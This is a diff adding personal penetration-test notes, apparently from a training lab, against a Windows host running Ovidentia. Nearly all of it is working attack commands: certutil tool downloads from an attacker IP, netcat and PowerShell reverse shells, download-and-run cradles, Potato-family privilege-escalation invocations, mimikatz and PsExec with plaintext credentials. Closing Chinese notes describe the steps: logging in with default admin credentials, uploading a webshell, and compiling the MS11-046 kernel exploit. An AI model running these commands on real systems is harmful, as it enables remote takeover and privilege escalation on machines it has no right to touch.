@@ -1,0 +1,116 @@
+nmap -sV -sC 10.11.1.73 -Pn > nmap.txt
+nmap  10.11.1.73 > nmapall.txt
+
+gobuster dir  -u http://10.11.1.73:5800/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,cgi -t50 > gobuster.txt
+gobuster dir  -u http://10.11.1.73:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,cgi -t50 > gobuster.txt
+gobuster dir  -u http://10.11.1.73:8080/php -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,cgi  > gobusterphp.txt
+
+
+
+
+certutil.exe -urlcache -split -f http://192.168.119.134/MSFRottenPotato.exe MSFRottenPotato.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/shell.bat shell.bat
+certutil.exe -urlcache -split -f http://192.168.119.134/Juicy.Potato.x86.exe jc.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/nc.exe nc.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/winPEASx86.exe winPEASx86.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/powercat.ps1 powercat.ps1
+certutil.exe -urlcache -split -f http://192.168.119.134/CLSID.list CLSID.list
+certutil.exe -urlcache -split -f http://192.168.119.134/test_clsid.bat test_clsid.bat
+certutil.exe -urlcache -split -f http://192.168.119.134/shellmsf.bat shellmsf.bat
+certutil.exe -urlcache -split -f http://192.168.119.134/PsExec.exe PsExec.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/RoguePotato.exe RoguePotato.exe
+certutil.exe -urlcache -split -f http://192.168.119.134/exploit.exe exploit.exe
+
+
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\nc.exe -nv 192.168.119.134 5555 -e C:\WINDOWS\System32\cmd.exe"
+
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\MSFRottenPotato.exe * C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\shell.bat
+
+powershell -NoP -NonI -W Hidden -Exec Bypass -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.134',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -nop -exec bypass -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.134',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.134',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powercat -c 192.168.119.134 -p 443 -e cmd.exe
+
+powershell.exe -c IEX(New-Object Net.Webclient).downloadstring('http://192.168.119.134/powercat.ps1')
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/Invoke-PowerShellTcp.ps1')
+
+IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.26:8000/Sherlock.ps1')
+powershell IEX (New-Object Net.Webclient).DownloadString('http://192.168.119.134/PowerUp.ps1')
+
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set payload windows/shell_reverse_tcp
+
+runas.exe /savecred /user:administrator  mimikatz.exe "%sysdrive%\testScripts\testscript1.ps1"
+runas /user:jill cmd
+
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\MSFRottenPotato.exe * C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\shell.bat
+
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\jc.exe -t t -p c:\windows\system32\cmd.exe -l 1337
+
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\jc.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c '{6d8ff8e0-730d-11d4-bf42-00b0d0118b56}'
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\jc.exe -p C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\shellmsf.bat  -t * -c '{6d8ff8e0-730d-11d4-bf42-00b0d0118b56}'
+
+msfvenom -p cmd/windows/reverse_powershell lhost=192.168.119.134 lport=9999 > shellmsf.bat
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\jc.exe  -t * -p C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\shellmsf.bat -l 443 -c '{6d8ff8e0-730d-11d4-bf42-00b0d0118b56}'
+
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\jc.exe  -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
+
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\nc.exe -e cmd.exe 192.168.119.134 443
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\jc.exe  -l 8014 -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\nc.exe  -e cmd.exe 192.168.119.134 443" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\jc.exe  -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://192.168.119.134/Invoke-PowerShellTcp.ps1')" -t * -c '{6d8ff8e0-730d-11d4-bf42-00b0d0118b56}'
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\jc.exe  -l 1337 -p C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\cmd.exe -a "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://192.168.119.134/Invoke-PowerShellTcp.ps1')" -t * -c {6d8ff8e0-730d-11d4-bf42-00b0d0118b56}
+
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\jc.exe  -l 1234 -p C:\windows\system32\cmd.exe -a "-e cmd.exe 192.168.119.134 5555" -t * -c {6d8ff8e0-730d-11d4-bf42-00b0d0118b56}
+
+cmd.exe /c whoam & C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\RoguePotato.exe -r 192.168.119.134 -e "C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\nc.exe 192.168.119.134 9005 -e cmd.exe" -l 9999
+
+
+runas /user:jill C:\Windows\System32\cmd.exe
+echo "hill" | sudo -S -u jill "whoami"
+.\PsExec.exe \\GAMMA -u jill -p hill cmd C:\Windows\System32\cmd.exe
+
+
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\jc.exe  -t * -p c:\admin\procexp.exe -l 5837 -c "{659cdea7-489e-11d9-a9cd-000d56965251}"
+Juicy.Potato.x86.exe -t t -p c:\admin\procexp.exe -l 5839 -c "{A47979D2-C419-11D9-A5B4-001185AD2B89}"
+
+
+{0289a7c5-91bf-4547-81ae-fec91a89dec5};GAMMA\jill
+{6d8ff8e0-730d-11d4-bf42-00b0d0118b56};GAMMA\jill
+{9678f47f-2435-475c-b24a-4606f8161c16};GAMMA\jill
+{A5B020FD-E04B-4e67-B65A-E7DEED25B2CF};GAMMA\jill
+{9acf41ed-d457-4cc1-941b-ab02c26e4686};GAMMA\jill
+{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83};GAMMA\jill
+{98068995-54d2-4136-9bc9-6dbcb0a4683f};GAMMA\jill
+
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/Invoke-PowerShellTcp.ps1')
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\nc.exe -e cmd.exe 192.168.119.134 4444
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\jc.exe  -l 5837 -p C:\windows\system32\cmd.exe -a "-e C:\windows\system32\cmd.exe 192.168.119.134 5555" -t * -c {98068995-54d2-4136-9bc9-6dbcb0a4683f}'
+C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\jc.exe  -l 1337 -p C:\wamp\www\PHP\myfolder\fileManager\collectives\DG0\777\cmd.exe -a "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://192.168.119.134/Invoke-PowerShellTcp.ps1')" -t * -c {6d8ff8e0-730d-11d4-bf42-00b0d0118b56}''
+
+
+
+
+1.nmap發現8080端口是ovidentia服務，google密任帳密後可直接登入
+nickname = admin@admin.bab,password = 012345678
+2.登入ovidentia後台後,將site裡面的存放路徑改成C:\wamp\www\PHP\myfolder
+3.到左邊file manager創建文件夾及給予權限(right裡面給)
+https://forums.offensive-security.com/showthread.php?26127-How-to-make-a-folder-on-the-web-portal-and-see-where-your-files-get-uploaded
+4.右邊可看到file manager,可上傳檔案,上傳檔案後訪問路徑
+http://10.11.1.73:8080/PHP/myfolder/fileManager/collectives/DG0/777/exploit.php
+5.上傳exploit.php後可以執行指令取得revershell
+6.執行powershell one liner指令取得的shell 無報錯返回
+7.嘗試執行本地Invoke-PowerShellTcp.ps1 可取得互動式shell
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.134/Invoke-PowerShellTcp.ps1')
+8.或是reverse.php windows版本,可以直接取得正常的shell
+9.嘗試了所有potato及CLSID及port都不行
+10.根據windows7版本查找內核提權漏洞,MS11-046,查找到40564.c
+11.根據網上文章在kali上compile 40564.c 變成exploit.exe
+https://www.hackingtutorials.org/exploit-tutorials/mingw-w64-how-to-compile-windows-exploits-on-kali-linux/
+12.傳到victim後成功取得administrator
+
+
+apt-get update
+apt-get install mingw-w64
+i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
